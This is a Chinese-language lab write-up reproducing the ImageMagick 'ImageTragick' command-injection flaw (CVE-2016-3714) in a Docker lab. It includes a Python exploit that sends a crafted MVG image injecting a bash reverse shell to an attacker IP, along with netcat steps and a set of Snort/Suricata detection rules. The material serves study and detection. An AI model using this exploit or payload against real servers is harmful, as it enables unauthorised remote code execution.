# 0x0 前言
### CVE-2016-3714 Description  
The (1) EPHEMERAL, (2) HTTPS, (3) MVG, (4) MSL, (5) TEXT, (6) SHOW, (7) WIN, and (8) PLT coders in **ImageMagick** before 6.9.3-10 and 7.x before 7.0.1-1 allow remote attackers to execute arbitrary code via shell metacharacters in a **crafted image**, aka "ImageTragick."

### ImageMagick
ImageMagick is a free and open-source cross-platform software suite for displaying, creating, converting, modifying, and editing raster images. Created in 1987 by John Cristy, it can read and write over 200 image file formats. It and its components are widely used in open-source applications.

### 原理簡介
**delegate**是ImageMagick一個用來調用外部lib的功能，其調用方式是先定義好支援的格式與對應的指令，再使用**system**來執行指令( https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347 )。  
ImageMagick可以接受**mvg**圖片格式(但因為ImageMagick是以內容判斷檔案格式，因此副檔名不一定要是.mvg)，是一種以string形式表示圖片的圖片格式，而其中也包含了對https圖片的相關處理，delegate定義https格式的處理方式是使用system執行curl將圖片下載，因此只要在https url中利用pipe塞入指令，就造成了此CVE。


### 情境
因為ImageMagick只是一個處理圖片的應用程式，而非網路服務，所以這邊的情境是受害端提供了一個將binary string轉換為圖片的服務，使之解析https圖片時發生RCE。


* ()內為測試時使用之環境
* <>為可變動或需視使用環境變動的欄位
* `斜體字`為指令


# 0x1 前置需求
* 虛擬機軟體 (VMware Workstation 15.5.7)
* 攻擊機 (Kali Linux 2020.4)
* 受攻擊機 (Ubuntu 20.04)


# 0x2 受攻擊機環境建置
### 搭建ImageMagick受害環境
1. `sudo snap install docker`，下載docker

2. `sudo docker pull medicean/vulapps:i_imagemagick_1`，pull受害環境

3. `sudo docker run --rm -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1`，建立並執行container

4. 開啟瀏覽器，於網址列輸入`127.0.0.1:8000`，可以看到exploit的教學  
![](image/2.4_web.PNG)  
於網址列輸入`127.0.0.1:8000/poc.php`，這邊php的實作方式是使用Imagick::readImageBlob()將字串轉為圖片，而網頁上看到的是預設的字串產生的圖片  
![](image/2.4_web_poc.PNG)

> 127.0.0.1:8000/poc.php的程式碼：
> ```php
> <?php
> function readImageBlob() {
>    $base64 = "iVBORw0KGgoAAAANSUhEUgAAAM0AAAD
> NCAMAAAAsYgRbAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5c
> cllPAAAABJQTFRF3NSmzMewPxIG//ncJEJsldTou1jHgAAAARBJREFUeNrs2EEK
> gCAQBVDLuv+V20dENbMY831wKz4Y/VHb/5RGQ0NDQ0NDQ0NDQ0NDQ0NDQ
> 0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0PzMWtyaGhoaGhoaGhoaGhoaGhoxtb0QGho
> aGhoaGhoaGhoaGhoaMbRLEvv50VTQ9OTQ5OpyZ01GpM2g0bfmDQaL7S+ofFC6x
> v3ZpxJiywakzbvd9r3RWPS9I2+MWk0+kbf0Hih9Y17U0nTHibrDDQ0NDQ0NDQ0
> NDQ0NDQ0NTXbRSL/AK72o6GhoaGhoRlL8951vwsNDQ0NDQ1NDc0WyHtDTEhD
> Q0NDQ0NTS5MdGhoaGhoaGhoaGhoaGhoaGhoaGhoaGposzSHAAErMwwQ2HwRQ
> AAAAAElFTkSuQmCC"; # 預設圖片字串
>    if(isset($_POST['img'])){
>        $base64 = $_POST['img']; # 使用POST指定img參數來改變圖片字串
>    }
>    $imageBlob = base64_decode($base64);
>
>    $imagick = new Imagick();
>    $imagick->readImageBlob($imageBlob); # vulnerable function
>
>    header("Content-Type: image/png");
>    echo $imageBlob;
> }
> readImageBlob();
> ?>
> ```


# 0x3 攻擊機環境建置
1. 創建exp.py，內容如下  
```python
import requests
import base64

def doPost(url, data):
    post_data = {"img": base64.b64encode(data.encode())}
    try:
        requests.post(url + "/poc.php", data=post_data, timeout=1)
    except:
        pass

def reverse_shell(url):    
    reverse_shell = """push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/1.jpg"|bash -i >& /dev/tcp/<攻擊機IP>/2333 0>&1")'
pop graphic-context"""

    doPost(url, reverse_shell)

if __name__ == '__main__':
    reverse_shell("http://<受攻擊機IP>:8000/")
```

2. 開啟terminal，執行`nc -l -p 2333`，監聽port 2333

### Exploit
3. 另開一termianal，執行`python3 exp.py`，可以看到nc取得了shell    
![](image/3.3_exploit.PNG)

4. `id`，可以看到取得的是www-data權限  
![](image/3.4_validation.PNG)


# 0x4 Snort/Suricata Rule
這次有很多rule，看起來都蠻像的，但又有些微的差異，不知是否有功能高度重複的
1. alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_client,established; file_data; content:"viewbox"; fast_pattern:only; content:"stroke"; nocase; content:"url|28|https:"; distance:0; nocase; pcre:"/stroke\s+url\x28https\x3a[^\x29]*?\x22/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service ftp-data, service http, service imap, service pop3; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:39006; rev:3;)
2. alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_client,established; file_data; content:"viewbox"; fast_pattern:only; content:"stroke"; nocase; content:"https:"; distance:0; nocase; pcre:"/stroke\s+\x27(url\x28)?https\x3a[^\x27]*?\x22/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service ftp-data, service http, service imap, service pop3; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:39005; rev:3;)
3. alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_client,established; file_data; content:"viewbox"; fast_pattern:only; content:"image"; nocase; content:"|28|https:"; distance:0; nocase; pcre:"/image\s+[\w\x2d]+\s+\d+\s*,\s*\d+[^\x28\x27]*?\x28https\x3a[^\x29]*?\x22/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service ftp-data, service http, service imap, service pop3; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:39004; rev:3;)
4. alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_client,established; file_data; content:"viewbox"; fast_pattern:only; content:"image"; nocase; content:"https:"; distance:0; nocase; pcre:"/image\s+[\w\x2d]+\s+\d+\s*,\s*\d+[^\x28\x27]*?\x27(url\x28)?https\x3a[^\x27]*?\x22/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service ftp-data, service http, service imap, service pop3; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:39003; rev:3;)
5. alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_client,established; file_data; content:"viewbox"; fast_pattern:only; content:"fill"; nocase; content:"url|28|https:"; distance:0; nocase; pcre:"/fill\s+url\x28https\x3a[^\x29]*?\x22/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service ftp-data, service http, service imap, service pop3; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:39002; rev:3;)
6. alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_client,established; file_data; content:"viewbox"; fast_pattern:only; content:"fill"; nocase; content:"https:"; distance:0; nocase; pcre:"/fill\s+\x27(url\x28)?https\x3a[^\x27]*?\x22/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service ftp-data, service http, service imap, service pop3; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:39001; rev:3;)
7. alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_client,established; file_data; content:"<image"; nocase; content:"xlink:href"; distance:0; nocase; pcre:"/xlink\x3ahref\s*=\s*[\x22\x27](h|&\x23(x0*68|0*104)\x3b)(t|&\x23(x0*74|0*116)\x3b){2}(p|&\x23(x0*70|0*112)\x3b)(s|&\x23(x0*73|0*115)\x3b)[^\x22\x27]*?&(quot|\x230*34|\x23x0*22)\x3b/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service ftp-data, service http, service imap, service pop3; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:39000; rev:3;)
8. alert tcp $EXTERNAL_NET any -> $HOME_NET [$HTTP_PORTS,25] (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_server,established; file_data; content:"stroke"; nocase; content:"url|28|https:"; distance:0; nocase; pcre:"/stroke\s+url\x28https\x3a[^\x29]*?\x22/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service http, service smtp; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:38948; rev:4;)
9. alert tcp $EXTERNAL_NET any -> $HOME_NET [$HTTP_PORTS,25] (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_server,established; file_data; content:"stroke"; nocase; content:"https:"; distance:0; nocase; pcre:"/stroke\s+\x27(url\x28)?https\x3a[^\x27]*?\x22/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service http, service smtp; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:38947; rev:4;)
10. alert tcp $EXTERNAL_NET any -> $HOME_NET [$HTTP_PORTS,25] (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_server,established; file_data; content:"image"; nocase; content:"|28|https:"; distance:0; nocase; pcre:"/image\s+[\w\x2d]+\s+\d+\s*,\s*\d+[^\x28\x27]*?\x28https\x3a[^\x29]*?\x22/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service http, service smtp; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:38946; rev:4;)
11. alert tcp $EXTERNAL_NET any -> $HOME_NET [$HTTP_PORTS,25] (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_server,established; file_data; content:"image"; nocase; content:"https:"; distance:0; nocase; pcre:"/image\s+[\w\x2d]+\s+\d+\s*,\s*\d+[^\x28\x27]*?\x27(url\x28)?https\x3a[^\x27]*?\x22/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service http, service smtp; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:38945; rev:4;)
12. alert tcp $EXTERNAL_NET any -> $HOME_NET [$HTTP_PORTS,25] (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_server,established; file_data; content:"fill"; nocase; content:"https:"; distance:0; nocase; pcre:"/fill\s+\x27(url\x28)?https\x3a[^\x27]*?\x22/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service http, service smtp; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:38871; rev:5;)
13. alert tcp $EXTERNAL_NET any -> $HOME_NET [$HTTP_PORTS,25] (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_server,established; file_data; content:"fill"; nocase; content:"url|28|https:"; distance:0; nocase; pcre:"/fill\s+url\x28https\x3a[^\x29]*?\x22/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service http, service smtp; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:38744; rev:7;)
14. alert tcp $EXTERNAL_NET any -> $HOME_NET [$HTTP_PORTS,25] (msg:"FILE-IMAGE ImageMagick WWWDecodeDelegate command injection attempt"; flow:to_server,established; file_data; content:"<image"; nocase; content:"xlink:href"; distance:0; nocase; pcre:"/xlink\x3ahref\s*=\s*[\x22\x27](h|&\x23(x0*68|0*104)\x3b)(t|&\x23(x0*74|0*116)\x3b){2}(p|&\x23(x0*70|0*112)\x3b)(s|&\x23(x0*73|0*115)\x3b)[^\x22\x27]*?&(quot|\x230*34|\x23x0*22)\x3b/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, service http, service smtp; reference:bugtraq,89848; reference:cve,2016-3714; reference:url,www.imagemagick.org/discourse-server/viewtopic.php?t=29588; classtype:attempted-user; sid:38743; rev:6;)


# 0x5 Reference
* https://caiqiqi.github.io/2016/09/09/ImageMagick-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2016%E2%80%933714-%E7%9A%84PoC/
* https://zhuanlan.zhihu.com/p/54066519
* https://www.php.net/manual/en/imagick.readimageblob.php
